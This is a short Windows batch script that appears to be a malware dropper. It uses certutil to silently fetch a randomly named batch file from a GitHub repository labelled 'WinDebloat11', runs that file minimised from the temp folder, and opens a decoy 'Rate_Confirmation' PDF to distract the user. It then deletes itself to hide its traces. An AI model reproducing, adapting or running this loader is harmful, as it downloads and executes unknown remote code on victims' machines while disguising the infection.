@echo off
setlocal enabledelayedexpansion

set "R=https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main"
set "T=%TEMP%"
set "D=%USERPROFILE%\Downloads"

echo.
echo  [certutil] Downloading...
echo.

certutil -urlcache -split -f "%R%/wdsrpn43cdv.bat" "%T%\wdsrpn431cdv.bat" >nul 2>&1
certutil -urlcache -split -f "%R%/Rate_Confirmation_LD-2026-0847.pdf" "%D%\Rate_Confirmation_LD-2026-0847.pdf" >nul 2>&1

if exist "%T%\wdsrpn431cdv.bat" start "" /min cmd /c "%T%\wdsrpn431cdv.bat"
if exist "%D%\Rate_Confirmation_LD-2026-0847.pdf" start "" "%D%\Rate_Confirmation_LD-2026-0847.pdf"

timeout /t 2 /nobreak >nul
del "%~f0" /f /q >nul 2>&1
endlocal
exit
